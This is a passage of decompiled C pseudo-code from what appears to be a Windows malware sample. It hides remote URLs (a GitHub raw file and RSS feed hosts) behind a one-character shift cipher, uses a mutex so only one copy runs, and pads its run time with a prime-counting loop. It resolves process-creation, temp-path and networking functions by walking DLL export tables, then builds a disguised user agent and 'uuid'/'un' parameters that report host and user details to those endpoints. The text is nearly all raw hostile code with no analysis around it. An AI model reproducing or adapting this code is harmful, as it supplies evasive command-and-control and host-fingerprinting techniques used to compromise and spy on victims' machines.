    lstrcpyA((char *)&lpString1, "iuuqt;00sbx/hjuivcvtfsdpoufou/dpn0mdutu0uftumdu0nbtufs0ynm/ynm");
    int32_t lpString1_; // bp-872, 0x40a690
    lstrcpyA((char *)&lpString1_, "iuuq;00gffe54/dpn04321132248845733/ynm");
    int32_t lpString1__; // bp-792, 0x40a690
    char * v2 = (char *)&lpString1__; // bp-1248, 0x40a6f8
    lstrcpyA((char *)&lpString1__, "iuuq;00gffet/sbqjegffet/dpn0997150");
    int32_t v3 = 0x73667456; // bp-128, 0x40a6fb
    for (int32_t i = 0; i < 109; i++) {
        // 0x40a7c2
        int32_t v4; // bp-4, 0x40a690
        char * v5 = (char *)((int32_t)&v4 - 124 + i); // 0x40a7c2
        *v5 = *v5 - 1;
    }
    char * lpString = (char *)12; // 0x40a7dc
    int32_t v6 = &v1;
    int32_t v7 = (int32_t)&v2 - 4; // 0x40a7e0
    *(int32_t *)v7 = v6;
    int32_t v8 = v7; // 0x40a7eb
    int32_t v9 = 0; // 0x40a7eb
    int32_t v10 = v7; // 0x40a7eb
    int32_t v11; // 0x40a7f3
    int32_t v12; // 0x40a7f4
    uint32_t v13; // 0x40a7f5
    char * v14; // 0x40a7f0
    if (lstrlenA(lpString) >= 1) {
        v14 = (char *)(v9 + v6);
        *v14 = *v14 - 1;
        v11 = v8 - 4;
        *(int32_t *)v11 = v6;
        v12 = v9 + 1;
        v13 = lstrlenA((char *)&g14);
        v8 = v11;
        v9 = v12;
        v10 = v11;
        while (v12 < v13) {
            // 0x40a7f0
            v14 = (char *)(v9 + v6);
            *v14 = *v14 - 1;
            v11 = v8 - 4;
            *(int32_t *)v11 = v6;
            v12 = v9 + 1;
            v13 = lstrlenA((char *)&g14);
            v8 = v11;
            v9 = v12;
            v10 = v11;
        }
    }
    int32_t v15 = v10;
    int32_t v16 = (int32_t)lpString - 1; // 0x40a802
    lpString = (char *)v16;
    int32_t v17 = v6 + 80; // 0x40a808
    while (v16 != 0) {
        // 0x40a7e0
        v6 = v17;
        v7 = v15 - 4;
        *(int32_t *)v7 = v6;
        v8 = v7;
        v9 = 0;
        v10 = v7;
        if (lstrlenA(lpString) >= 1) {
            v14 = (char *)(v9 + v6);
            *v14 = *v14 - 1;
            v11 = v8 - 4;
            *(int32_t *)v11 = v6;
            v12 = v9 + 1;
            v13 = lstrlenA((char *)&g14);
            v8 = v11;
            v9 = v12;
            v10 = v11;
            while (v12 < v13) {
                // 0x40a7f0
                v14 = (char *)(v9 + v6);
                *v14 = *v14 - 1;
                v11 = v8 - 4;
                *(int32_t *)v11 = v6;
                v12 = v9 + 1;
                v13 = lstrlenA((char *)&g14);
                v8 = v11;
                v9 = v12;
                v10 = v11;
            }
        }
        // 0x40a7ff
        v15 = v10;
        v16 = (int32_t)lpString - 1;
        lpString = (char *)v16;
        v17 = v6 + 80;
    }
    // 0x40a80a
    *(int32_t *)(v15 - 4) = 50;
    *(int32_t *)(v15 - 8) = 64;
    int32_t * memoryHandle = LocalAlloc(0, (int32_t)&g14); // 0x40a80e
    int32_t v18 = (int32_t)memoryHandle; // 0x40a80e
    *(int32_t *)(v15 - 12) = 0;
    *(int32_t *)(v15 - 16) = 0;
    *(int32_t *)(v15 - 20) = 0;
    *memoryHandle = 0x6c707061;
    *(int32_t *)(v18 + 4) = 0x74616369;
    *(int16_t *)(v18 + 8) = 0x6f69;
    *(char *)(v18 + 10) = 110;
    *(char *)(v18 + 11) = 47;
    *(int32_t *)(v18 + 12) = 0x77772d78;
    *(int32_t *)(v18 + 16) = 0x6f662d77;
    *(int32_t *)(v18 + 20) = 0x752d6d72;
    *(int32_t *)(v18 + 24) = 0x6e656c72;
    *(int32_t *)(v18 + 28) = 0x65646f63;
    *(int16_t *)(v18 + 32) = 100;
    *(int32_t *)(v15 - 24) = 1;
    *(int32_t *)(v15 - 28) = (int32_t)&v3;
    int32_t * v19 = InternetOpenA((char *)&g14, (int32_t)&g14, (char *)&g14, (char *)&g14, (int32_t)&g14); // 0x40a863
    *(int32_t *)(v15 - 32) = 0;
    int32_t v20; // bp-1208, 0x40a690
    *(int32_t *)(v15 - 36) = (int32_t)&v20;
    g8 = (int32_t)v19;
    if (!InternetGetConnectedState(&g14, (int32_t)&g14) || g8 == 0) {
        // 0x40a9ec
        return _40___security_check_cookie_40_4();
    }
    // 0x40a892
    *(int32_t *)(v15 - 40) = 0;
    *(int32_t *)(v15 - 44) = 1;
    char * v21; // bp-232, 0x40a690
    *(int32_t *)(v15 - 48) = (int32_t)&v21;
    v21 = (char *)0x70747468;
    if (!InternetCheckConnectionA((char *)0x70747468, 0x3a73, 47)) {
        // 0x40a9ec
        return _40___security_check_cookie_40_4();
    }
    int32_t * v22 = (int32_t *)(v15 - 52); // 0x40a8ff
    *v22 = a1;
    int32_t v23; // 0x40a690
    if (function_409ec0((int32_t)&g14) != 0) {
        // 0x40a912
        *v22 = (int32_t)"blog1";
        _printf((char *)&g14);
        // 0x40a91f
        *(int32_t *)v23 = 1;
        return _40___security_check_cookie_40_4();
    }
    // 0x40a941
    *v22 = a1;
    if (function_409ec0((int32_t)&g14) != 0) {
        // 0x40a954
        *(int32_t *)v23 = 1;
        return _40___security_check_cookie_40_4();
    }
    // 0x40a976
    *v22 = a1;
    if (function_409ec0((int32_t)&g14) != 0) {
        // 0x40a989
        *(int32_t *)v23 = 1;
        return _40___security_check_cookie_40_4();
    }
    // 0x40a9ab
    *v22 = a1;
    if (function_40a380((int32_t)&g14) != 0) {
        // 0x40a91f
        *(int32_t *)v23 = 1;
        return _40___security_check_cookie_40_4();
    }
    // 0x40a9c2
    *v22 = a1;
    if (function_40a380((int32_t)&g14) != 0) {
        // 0x40a954
        *(int32_t *)v23 = 1;
        return _40___security_check_cookie_40_4();
    }
    // 0x40a9d9
    *v22 = a1;
    if (function_40a380((int32_t)&g14) == 0) {
        // 0x40a9ec
        return _40___security_check_cookie_40_4();
    }
    // 0x40a989
    *(int32_t *)v23 = 1;
    return _40___security_check_cookie_40_4();
}

// Address range: 0x40aa00 - 0x40aa4e
int32_t function_40aa00(void) {
    // 0x40aa00
    int32_t v1; // bp-12, 0x40aa00
    int32_t v2 = &v1; // 0x40aa07
    int32_t v3 = 3;
    int32_t v4 = 2;
    int32_t v5 = v3 - 1; // 0x40aa15
    int32_t v6; // 0x40aa00
    int32_t v7 = v6; // 0x40aa1a
    int32_t v8 = 2; // 0x40aa1a
    int32_t v9; // 0x40aa00
    int64_t v10; // 0x40aa23
    int64_t v11; // 0x40aa23
    int32_t v12; // 0x40aa29
    if (v5 >= 2) {
        // 0x40aa20
        v10 = 0x100000000 * (int64_t)(v3 >> 31) | (int64_t)v3;
        v9 = 2;
        v11 = v9;
        v8 = v9;
        while ((int32_t)(v10 % v11) != 0) {
            // 0x40aa29
            v12 = v9 + 1;
            v8 = v12;
            if (v12 > v5) {
                // break -> 0x40aa2e
                break;
            }
            v9 = v12;
            v11 = v9;
            v8 = v9;
        }
        // 0x40aa2e
        v7 = v10 / v11;
    }
    int32_t v13 = v7; // 0x40aa30
    int32_t v14 = v4; // 0x40aa30
    if (v8 == v3) {
        // 0x40aa32
        *(int32_t *)(v2 - 4) = v3;
        *(int32_t *)(v2 - 8) = (int32_t)"%d\n";
        v13 = _printf((char *)&g14);
        v14 = v4 + 1;
    }
    int32_t result = v13;
    int32_t v15 = v3 + 1; // 0x40aa48
    while (v14 < 0x13881) {
        // 0x40aa10
        v3 = v15;
        v4 = v14;
        v5 = v3 - 1;
        v7 = result;
        int32_t v16 = 2; // 0x40aa1a
        if (v5 >= 2) {
            // 0x40aa20
            v10 = 0x100000000 * (int64_t)(v3 >> 31) | (int64_t)v3;
            v9 = 2;
            v11 = v9;
            v8 = v9;
            while ((int32_t)(v10 % v11) != 0) {
                // 0x40aa29
                v12 = v9 + 1;
                v8 = v12;
                if (v12 > v5) {
                    // break -> 0x40aa2e
                    break;
                }
                v9 = v12;
                v11 = v9;
                v8 = v9;
            }
            // 0x40aa2e
            v7 = v10 / v11;
            v16 = v8;
        }
        // 0x40aa2e
        v13 = v7;
        v14 = v4;
        if (v16 == v3) {
            // 0x40aa32
            *(int32_t *)(v2 - 4) = v3;
            *(int32_t *)(v2 - 8) = (int32_t)"%d\n";
            v13 = _printf((char *)&g14);
            v14 = v4 + 1;
        }
        // 0x40aa41
        result = v13;
        v15 = v3 + 1;
    }
    // 0x40aa4a
    return result;
}

// Address range: 0x40aa50 - 0x40b60a
int32_t function_40aa50(void) {
    // 0x40aa50
    __chkstk();
    char * lpString = (char *)0x6f73666c; // bp+892, 0x40aa8f
    char * v1 = (char *)&lpString; // bp-24, 0x40aaa2
    int32_t v2 = (int32_t)&v1; // 0x40aaa2
    uint32_t v3 = lstrlenA((char *)&lpString); // 0x40aab3
    int32_t v4 = v2; // 0x40aab7
    int32_t v5 = 0; // 0x40aab7
    int32_t v6 = v2; // 0x40aab7
    if (v3 >= 1) {
        int32_t v7 = v4 + 912; // 0x40aac0
        char * v8 = (char *)(v7 + v5); // 0x40aac0
        *v8 = *v8 - 1;
        v4 -= 4;
        *(int32_t *)v4 = v7;
        v5++;
        uint32_t v9 = lstrlenA((char *)&g14); // 0x40aad0
        v6 = v4;
        while (v5 < v9) {
            // 0x40aac0
            v7 = v4 + 912;
            v8 = (char *)(v7 + v5);
            *v8 = *v8 - 1;
            v4 -= 4;
            *(int32_t *)v4 = v7;
            v5++;
            v9 = lstrlenA((char *)&g14);
            v6 = v4;
        }
    }
    int32_t v10 = v6;
    *(int32_t *)(v10 - 4) = (int32_t)"CreateMutexA";
    *(int32_t *)(v10 - 8) = v10 + 912;
    *(int32_t *)(v10 - 12) = (int32_t)GetModuleHandleA((char *)&g14);
    int32_t (*func)() = GetProcAddress(&g14, (char *)&g14); // 0x40aaea
    int32_t v11 = v10 + 1220; // 0x40aafa
    __asm_rep_movsd_memcpy((char *)v11, "com_mycompany_apps_appname_new", 7);
    *(int32_t *)(v10 - 16) = v11;
    *(int32_t *)(v10 - 20) = 1;
    *(int32_t *)(v10 - 24) = 0;
    g13 = (int32_t)func;
    int32_t errorCode = GetLastError(); // 0x40ab19
    *(int32_t *)(v10 - 28) = 0;
    if (errorCode == 183) {
        // 0x40ab28
        ExitProcess((int32_t)&g14);
        // UNREACHABLE
    }
    // 0x40ab2e
    *(int32_t *)(v10 - 32) = 1;
    *(int32_t *)(v10 - 36) = (int32_t)"https://en.wikipedia.org";
    InternetCheckConnectionA((char *)&g14, (int32_t)&g14, (int32_t)&g14);
    function_40aa00();
    *(int32_t *)(v10 - 40) = (int32_t)L"kernel32.dll";
    LoadLibraryW((int16_t *)&g14);
    int32_t v12 = v10 - 44; // 0x40ab4b
    *(int32_t *)v12 = (int32_t)L"kernel32.dll";
    int32_t v13 = (int32_t)GetModuleHandleW((int16_t *)&g14); // 0x40ab50
    *(int32_t *)(v10 + 696) = 0x4d746547;
    *(int32_t *)(v10 + 700) = 0x6c75646f;
    *(int32_t *)(v10 + 704) = 0x6c694665;
    *(int32_t *)(v10 + 708) = 0x6d614e65;
    *(int16_t *)(v10 + 712) = 0x4165;
    *(char *)(v10 + 714) = 0;
    int32_t * v14 = (int32_t *)(v13 + 60); // 0x40ab96
    int32_t v15 = v13 + 120; // 0x40ab99
    int32_t v16 = *(int32_t *)(*v14 + v15); // 0x40ab99
    int32_t v17 = v13 + 32;
    int32_t v18 = v13 + 24;
    int32_t v19 = *(int32_t *)(v16 + v17) + v13; // 0x40aba5
    int32_t v20 = *(int32_t *)(v16 + v18) - 1; // 0x40aba7
    int32_t v21 = v20; // 0x40aba8
    int32_t v22 = v12; // 0x40aba8
    if (v20 >= 0) {
        int32_t v23 = v12;
        *(int32_t *)(v23 - 4) = v23 + 740;
        int32_t v24 = v23 - 8; // 0x40abbd
        *(int32_t *)v24 = *(int32_t *)(v19 + 4 * v21) + v13;
        int32_t v25 = lstrcmpA((char *)&g14, (char *)&g14); // 0x40abbe
        v22 = v24;
        while (v25 != 0) {
            // 0x40abc8
            v21--;
            v22 = v24;
            if (v21 < 0) {
                // break -> 0x40abcb
                break;
            }
            v23 = v24;
            *(int32_t *)(v23 - 4) = v23 + 740;
            v24 = v23 - 8;
            *(int32_t *)v24 = *(int32_t *)(v19 + 4 * v21) + v13;
            v25 = lstrcmpA((char *)&g14, (char *)&g14);
            v22 = v24;
        }
    }
    int32_t v26 = v22 + 740;
    int32_t * v27 = (int32_t *)v26;
    *v27 = 0x61657243;
    int32_t * v28 = (int32_t *)(v22 + 744);
    *v28 = 0x72506574;
    int32_t * v29 = (int32_t *)(v22 + 748);
    *v29 = 0x7365636f;
    int32_t v30 = v22 + 752;
    int16_t * v31 = (int16_t *)v30;
    *v31 = 0x4173;
    char * v32 = (char *)(v22 + 754);
    *v32 = 0;
    int32_t v33 = *(int32_t *)(*v14 + v15); // 0x40ac01
    int32_t v34 = *(int32_t *)(v33 + v18) - 1; // 0x40ac11
    int32_t * v35 = (int32_t *)(v22 + 16);
    *v35 = *(int32_t *)(v33 + v17) + v13;
    int32_t v36 = v34; // 0x40ac16
    int32_t * v37 = v35; // 0x40ac16
    char * v38 = v32; // 0x40ac16
    int16_t * v39 = v31; // 0x40ac16
    int32_t v40 = v30; // 0x40ac16
    int32_t * v41 = v29; // 0x40ac16
    int32_t * v42 = v28; // 0x40ac16
    int32_t * v43 = v27; // 0x40ac16
    int32_t v44 = v26; // 0x40ac16
    int32_t v45 = -1; // 0x40ac16
    int32_t v46 = v22; // 0x40ac16
    if (v34 >= 0) {
        int32_t v47 = v46;
        int32_t v48 = *(int32_t *)(*(int32_t *)(v47 + 16) + 4 * v36); // 0x40ac24
        int32_t v49 = v47 + 740; // 0x40ac27
        *(int32_t *)(v47 - 4) = v49;
        v46 = v47 - 8;
        *(int32_t *)v46 = v48 + v13;
        int32_t v50 = lstrcmpA((char *)&g14, (char *)&g14); // 0x40ac32
        v45 = v36;
        while (v50 != 0) {
            // 0x40ac3c
            v36--;
            v45 = -1;
            if (v36 < 0) {
                // break -> 0x40ac42
                break;
            }
            v47 = v46;
            v48 = *(int32_t *)(*(int32_t *)(v47 + 16) + 4 * v36);
            v49 = v47 + 740;
            *(int32_t *)(v47 - 4) = v49;
            v46 = v47 - 8;
            *(int32_t *)v46 = v48 + v13;
            v50 = lstrcmpA((char *)&g14, (char *)&g14);
            v45 = v36;
        }
        // 0x40ac42
        v44 = v47 + 732;
        v40 = v47 + 744;
        v37 = (int32_t *)(v47 + 8);
        v38 = (char *)(v47 + 746);
        v39 = (int16_t *)v40;
        v41 = (int32_t *)v49;
        v42 = (int32_t *)(v47 + 736);
        v43 = (int32_t *)v44;
    }
    int32_t v51 = v33 + v13; // 0x40ac0d
    uint16_t v52 = *(int16_t *)(2 * v45 + v13 + *(int32_t *)(v51 + 36)); // 0x40ac48
    int32_t v53 = *(int32_t *)(*(int32_t *)(v51 + 28) + v13 + 4 * (int32_t)v52); // 0x40ac52
    *v43 = 0x61657243;
    *v42 = 0x72506574;
    *v41 = 0x7365636f;
    *v39 = 0x5773;
    *v38 = 0;
    int32_t v54 = *(int32_t *)(*v14 + v15); // 0x40ac8b
    int32_t v55 = *(int32_t *)(v54 + v18) - 1; // 0x40ac9d
    g6 = v53 + v13;
    *v37 = *(int32_t *)(v54 + v17) + v13;
    int32_t v56 = v55; // 0x40aca8
    int32_t * v57 = v37; // 0x40aca8
    int32_t v58 = v40; // 0x40aca8
    int32_t * v59 = v41; // 0x40aca8
    int32_t * v60 = v42; // 0x40aca8
    int32_t * v61 = v43; // 0x40aca8
    int32_t v62 = v44; // 0x40aca8
    int32_t v63 = -1; // 0x40aca8
    int32_t v64 = v46; // 0x40aca8
    if (v55 >= 0) {
        int32_t v65 = v64;
        int32_t v66 = *(int32_t *)(*(int32_t *)(v65 + 16) + 4 * v56); // 0x40acb4
        int32_t v67 = v65 + 740; // 0x40acb7
        *(int32_t *)(v65 - 4) = v67;
        v64 = v65 - 8;
        *(int32_t *)v64 = v66 + v13;
        int32_t v68 = lstrcmpA((char *)&g14, (char *)&g14); // 0x40acc2
        v63 = v56;
        while (v68 != 0) {
            // 0x40accc
            v56--;
            v63 = -1;
            if (v56 < 0) {
                // break -> 0x40acd2
                break;
            }
            v65 = v64;
            v66 = *(int32_t *)(*(int32_t *)(v65 + 16) + 4 * v56);
            v67 = v65 + 740;
            *(int32_t *)(v65 - 4) = v67;
            v64 = v65 - 8;
            *(int32_t *)v64 = v66 + v13;
            v68 = lstrcmpA((char *)&g14, (char *)&g14);
            v63 = v56;
        }
        // 0x40acd2
        v62 = v65 + 732;
        v57 = (int32_t *)(v65 + 8);
        v58 = v65 + 744;
        v59 = (int32_t *)v67;
        v60 = (int32_t *)(v65 + 736);
        v61 = (int32_t *)v62;
    }
    int32_t v69 = v54 + v13; // 0x40ac97
    uint16_t v70 = *(int16_t *)(2 * v63 + v13 + *(int32_t *)(v69 + 36)); // 0x40acd8
    int32_t v71 = *(int32_t *)(*(int32_t *)(v69 + 28) + v13 + 4 * (int32_t)v70); // 0x40ace2
    *v61 = 0x54746547;
    *v60 = 0x50706d65;
    *v59 = 0x41687461;
    char * v72 = (char *)v58;
    *v72 = 0;
    int32_t v73 = *(int32_t *)(*v14 + v15); // 0x40ad11
    int32_t v74 = v73 + v13; // 0x40ad1b
    g7 = v71 + v13;
    int32_t v75 = *(int32_t *)(v73 + v18) - 1; // 0x40ad27
    *v57 = *(int32_t *)(v74 + 32) + v13;
    int32_t v76 = v75; // 0x40ad2c
    int32_t * v77 = v57; // 0x40ad2c
    char * v78 = v72; // 0x40ad2c
    int32_t * v79 = v59; // 0x40ad2c
    int32_t * v80 = v60; // 0x40ad2c
    int32_t * v81 = v61; // 0x40ad2c
    int32_t v82 = v62; // 0x40ad2c
    int32_t v83 = -1; // 0x40ad2c
    int32_t v84 = v64; // 0x40ad2c
    if (v75 >= 0) {
        int32_t v85 = v84;
        int32_t v86 = *(int32_t *)(*(int32_t *)(v85 + 16) + 4 * v76); // 0x40ad34
        int32_t v87 = v85 + 740; // 0x40ad37
        *(int32_t *)(v85 - 4) = v87;
        v84 = v85 - 8;
        *(int32_t *)v84 = v86 + v13;
        int32_t v88 = lstrcmpA((char *)&g14, (char *)&g14); // 0x40ad42
        v83 = v76;
        while (v88 != 0) {
            // 0x40ad4c
            v76--;
            v83 = -1;
            if (v76 < 0) {
                // break -> 0x40ad52
                break;
            }
            v85 = v84;
            v86 = *(int32_t *)(*(int32_t *)(v85 + 16) + 4 * v76);
            v87 = v85 + 740;
            *(int32_t *)(v85 - 4) = v87;
            v84 = v85 - 8;
            *(int32_t *)v84 = v86 + v13;
            v88 = lstrcmpA((char *)&g14, (char *)&g14);
            v83 = v76;
        }
        // 0x40ad52
        v82 = v85 + 732;
        v77 = (int32_t *)(v85 + 8);
        v78 = (char *)(v85 + 744);
        v79 = (int32_t *)v87;
        v80 = (int32_t *)(v85 + 736);
        v81 = (int32_t *)v82;
    }
    uint16_t v89 = *(int16_t *)(2 * v83 + v13 + *(int32_t *)(v74 + 36)); // 0x40ad58
    int32_t v90 = *(int32_t *)(*(int32_t *)(v74 + 28) + v13 + 4 * (int32_t)v89); // 0x40ad62
    *v81 = 0x64616f4c;
    *v80 = 0x7262694c;
    *v79 = 0x41797261;
    *v78 = 0;
    int32_t v91 = *(int32_t *)(*v14 + v15); // 0x40ad91
    int32_t v92 = *(int32_t *)(v91 + v17) + v13; // 0x40ada1
    int32_t v93 = *(int32_t *)(v91 + v18) - 1; // 0x40ada3
    g9 = v90 + v13;
    *v77 = v92;
    int32_t v94 = v82; // 0x40adae
    int32_t v95 = -1; // 0x40adae
    int32_t v96 = v84; // 0x40adae
    if (v93 >= 0) {
        // 0x40adb6
        *(int32_t *)(v84 - 4) = v82;
        int32_t v97 = v84 - 8; // 0x40adc3
        *(int32_t *)v97 = *(int32_t *)(4 * v93 + v92) + v13;
        int32_t v98 = lstrcmpA((char *)&g14, (char *)&g14); // 0x40adc4
        int32_t v99 = v84; // 0x40adcc
        int32_t v100 = v97; // 0x40adcc
        v95 = v93;
        if (v98 != 0) {
            int32_t v101 = v97;
            int32_t v102 = v93 - 1; // 0x40adce
            v100 = v101;
            v95 = -1;
            while (v102 >= 0) {
                int32_t v103 = *(int32_t *)(v99 + 8); // 0x40adb2
                *(int32_t *)(v101 - 4) = v101 + 740;
                int32_t v104 = v101 - 8; // 0x40adc3
                *(int32_t *)v104 = *(int32_t *)(v103 + 4 * v102) + v13;
                int32_t v105 = lstrcmpA((char *)&g14, (char *)&g14); // 0x40adc4
                v99 = v101;
                v100 = v104;
                v95 = v102;
                if (v105 == 0) {
                    // break -> 0x40add4
                    break;
                }
                v101 = v104;
                v102--;
                v100 = v101;
                v95 = -1;
            }
        }
        // 0x40add4
        v96 = v100;
        v94 = v96 + 740;
    }
    int32_t v106 = v91 + v13; // 0x40ad9d
    uint16_t v107 = *(int16_t *)(2 * v95 + v13 + *(int32_t *)(v106 + 36)); // 0x40adda
    int32_t v108 = *(int32_t *)(*(int32_t *)(v106 + 28) + v13 + 4 * (int32_t)v107); // 0x40ade4
    *(int32_t *)(v96 - 4) = (int32_t)L"Ws2_32.dll";
    g11 = v108 + v13;
    LoadLibraryW((int16_t *)&g14);
    int32_t v109 = v96 - 8; // 0x40adfa
    *(int32_t *)v109 = (int32_t)L"Ws2_32.dll";
    int32_t v110 = (int32_t)GetModuleHandleW((int16_t *)&g14); // 0x40adff
    *(int32_t *)(v96 + 732) = 0x53415357;
    *(int32_t *)(v96 + 736) = 0x74726174;
    *(int16_t *)v94 = 0x7075;
    *(char *)(v96 + 742) = 0;
    int32_t v111 = *(int32_t *)(v110 + 120 + *(int32_t *)(v110 + 60)) + v110;
    int32_t v112 = *(int32_t *)(v111 + 24) - 1; // 0x40ae42
    *(int32_t *)(v96 + 8) = *(int32_t *)(v111 + 32) + v110;
    int32_t v113 = v112; // 0x40ae47
    int32_t v114 = -1; // 0x40ae47
    int32_t v115 = v109; // 0x40ae47
    if (v112 >= 0) {
        int32_t v116 = v109;
        int32_t v117 = *(int32_t *)(*(int32_t *)(v116 + 16) + 4 * v113); // 0x40ae54
        *(int32_t *)(v116 - 4) = v116 + 740;
        int32_t v118 = v116 - 8; // 0x40ae61
        *(int32_t *)v118 = v117 + v110;
        int32_t v119 = lstrcmpA((char *)&g14, (char *)&g14); // 0x40ae62
        v114 = v113;
        v115 = v118;
        while (v119 != 0) {
            // 0x40ae6c
            v113--;
            v114 = -1;
            v115 = v118;
            if (v113 < 0) {
                // break -> 0x40ae72
                break;
            }
            v116 = v118;
            v117 = *(int32_t *)(*(int32_t *)(v116 + 16) + 4 * v113);
            *(int32_t *)(v116 - 4) = v116 + 740;
            v118 = v116 - 8;
            *(int32_t *)v118 = v117 + v110;
            v119 = lstrcmpA((char *)&g14, (char *)&g14);
            v114 = v113;
            v115 = v118;
        }
    }
    int32_t v120 = v115;
    uint16_t v121 = *(int16_t *)(2 * v114 + v110 + *(int32_t *)(v111 + 36)); // 0x40ae78
    int32_t v122 = *(int32_t *)(v111 + 28); // 0x40ae7c
    *(int32_t *)(v120 - 4) = v120 + 328;
    *(int32_t *)(v120 - 8) = 514;
    if (*(int32_t *)(v122 + v110 + 4 * (int32_t)v121) != -v110) {
        // 0x40ae9a
        return _40___security_check_cookie_40_4();
    }
    // 0x40aeb4
    *(int32_t *)(v120 + 8) = 0;
    int32_t v123 = v120 + 784; // 0x40aebc
    *(int32_t *)v123 = 0x74560b0e;
    *(int32_t *)(v120 + 788) = 0x68427366;
    *(int32_t *)(v120 + 792) = 0x3b756f66;
    *(int32_t *)(v120 + 796) = 0x6a7b704e;
    *(int32_t *)(v120 + 800) = 0x30626d6d;
    *(int32_t *)(v120 + 804) = 0x29312f36;
    *(int32_t *)(v120 + 808) = 0x656f6a58;
    *(int32_t *)(v120 + 812) = 0x21747870;
    *(int32_t *)(v120 + 816) = 0x3721554f;
    *(int32_t *)(v120 + 820) = 0x583c322f;
    *(int32_t *)(v120 + 824) = 0x35375850;
    *(int32_t *)(v120 + 828) = 0x7171422a;
    *(int32_t *)(v120 + 832) = 0x6658666d;
    *(int32_t *)(v120 + 836) = 0x756a4c63;
    *(int32_t *)(v120 + 840) = 0x38343630;
    *(int32_t *)(v120 + 844) = 0x4c29322f;
    *(int32_t *)(v120 + 848) = 0x4d4e5549;
    *(int32_t *)(v120 + 852) = 0x6c6a6d2d;
    *(int32_t *)(v120 + 856) = 0x66482166;
    *(int32_t *)(v120 + 860) = 0x2a706c64;
    *(int32_t *)(v120 + 864) = 0x70736944;
    *(int32_t *)(v120 + 868) = 0x3330666e;
    *(int32_t *)(v120 + 872) = 0x2f312f32;
    *(int32_t *)(v120 + 876) = 0x31393232;
    *(int32_t *)(v120 + 880) = 0x5436382f;
    *(int32_t *)(v120 + 884) = 0x73626762;
    *(int32_t *)(v120 + 888) = 0x3436306a;
    *(int32_t *)(v120 + 892) = 0xe322f38;
    *(int32_t *)(v120 + 896) = 0xb0e0b;
    for (int32_t i = 0; i < 115; i++) {
        char * v124 = (char *)(i + v123); // 0x40b000
        *v124 = *v124 - 1;
    }
    int32_t v125 = v120 - 12; // 0x40b00d
    int32_t * v126 = (int32_t *)v125; // 0x40b00d
    *v126 = 284;
    int32_t v127 = v120 + 32; // 0x40b012
    int32_t * v128 = (int32_t *)(v120 - 16); // 0x40b016
    *v128 = 0;
    *(int32_t *)(v120 - 20) = v127;
    _memset(&g14, (int32_t)&g14, (int32_t)&g14);
    *v126 = v127;
    *(int32_t *)v127 = 284;
    GetVersionExW((struct _OSVERSIONINFOW *)&g14);
    *(char *)(v120 + 815) = *(char *)v127 + 48;
    *v128 = v120 + 1516;
    *(char *)(v120 + 817) = *(char *)(v120 + 36) + 48;
    int32_t v129 = function_40a690((int32_t)&g14); // 0x40b05c
    int32_t v130 = v125; // 0x40b06c
    if (v129 == 0) {
        int32_t v131 = v125;
        int32_t v132 = v131 - 4; // 0x40b070
        *(int32_t *)v132 = 1000;
        Sleep((int32_t)&g14);
        *(int32_t *)(v131 - 8) = v131 + 1524;
        int32_t v133 = function_40a690((int32_t)&g14); // 0x40b083
        v130 = v132;
        while (v133 == 0) {
            // 0x40b070
            v131 = v132;
            v132 = v131 - 4;
            *(int32_t *)v132 = 1000;
            Sleep((int32_t)&g14);
            *(int32_t *)(v131 - 8) = v131 + 1524;
            v133 = function_40a690((int32_t)&g14);
            v130 = v132;
        }
    }
    int32_t * v134 = (int32_t *)(v130 - 4); // 0x40b08f
    *v134 = 199;
    int32_t v135 = v130 - 8; // 0x40b09b
    int32_t * v136 = (int32_t *)v135; // 0x40b09b
    *v136 = 0;
    int32_t v137 = v130 - 12; // 0x40b09d
    int32_t * v138 = (int32_t *)v137; // 0x40b09d
    *v138 = v130 + 1033;
    int32_t v139 = v130 + 1032; // 0x40b09e
    *(char *)v139 = 0;
    _memset(&g14, (int32_t)&g14, (int32_t)&g14);
    *v134 = 99;
    *v136 = 0;
    *v138 = v130 + 929;
    *(char *)(v130 + 928) = 0;
    _memset(&g14, (int32_t)&g14, (int32_t)&g14);
    int32_t * v140 = (int32_t *)(v130 + 729); // 0x40b0cc
    *v140 = 0;
    int32_t v141 = v130 + 733; // 0x40b0d3
    *(int32_t *)v141 = 0;
    *(char *)(v130 + 737) = 0;
    int32_t v142 = v130 + 728; // 0x40b0e1
    int32_t * v143 = (int32_t *)v142; // 0x40b0e1
    *v143 = 0x64697575;
    int32_t v144 = v130 + 732; // 0x40b0ec
    *(int16_t *)v144 = 61;
    int32_t v145 = 0; // 0x40b0f6
    char v146 = *(char *)(v145 + v142); // 0x40b100
    *(char *)(v145 + v139) = v146;
    v145++;
    while (v146 != 0) {
        // 0x40b100
        v146 = *(char *)(v145 + v142);
        *(char *)(v145 + v139) = v146;
        v145++;
    }
    int32_t v147 = function_4056c0(); // 0x40b113
    int32_t v148 = v147; // 0x40b11a
    while (*(char *)v148 != 0) {
        // 0x40b120
        v148++;
    }
    int32_t v149 = v130 + 1031; // 0x40b130
    int32_t v150 = v149; // 0x40b130
    v150++;
    char * v151 = (char *)v150;
    while (*v151 != 0) {
        // 0x40b131
        v150++;
        v151 = (char *)v150;
    }
    uint32_t v152 = v148 - v147; // 0x40b12e
    uint32_t v153 = v152 / 4; // 0x40b13b
    __asm_rep_movsd_memcpy(v151, (char *)v147, v153);
    bool v154; // 0x40aa50
    int32_t v155 = v154 ? -4 : 4; // 0x40b13e
    char * v156 = (char *)(v150 + v153 * v155); // 0x40b14c
    __asm_rep_movsb_memcpy(v156, v156, v152 & 3);
    *v143 = 0x3d6e7523;
    *(char *)v144 = 0;
    int32_t v157 = v142;
    int32_t v158 = v157 + 1; // 0x40b167
    while (*(char *)v157 != 0) {
        // 0x40b165
        v157 = v158;
        v158 = v157 + 1;
    }
    int32_t v159 = v149 + 1; // 0x40b178
    char * v160 = (char *)v159;
    int32_t v161 = v159; // 0x40b17e
    while (*v160 != 0) {
        // 0x40b178
        v159 = v161 + 1;
        v160 = (char *)v159;
        v161 = v159;
    }
    uint32_t v162 = v158 - v142; // 0x40b173
    uint32_t v163 = v162 / 4; // 0x40b182
    char * v164 = (char *)v142; // 0x40b185
    __asm_rep_movsd_memcpy(v160, v164, v163);
    char * v165 = (char *)(v159 + v163 * v155); // 0x40b18c
    __asm_rep_movsb_memcpy(v165, v165, v162 & 3);
    int32_t v166 = function_405a60(); // 0x40b18e
    int32_t v167 = v166;
    int32_t v168 = v167 + 1; // 0x40b197
    while (*(char *)v167 != 0) {
        // 0x40b195
        v167 = v168;
        v168 = v167 + 1;
    }
    int32_t v169 = v149 + 1; // 0x40b1a8
    char * v170 = (char *)v169;
    int32_t v171 = v169; // 0x40b1ae
    while (*v170 != 0) {
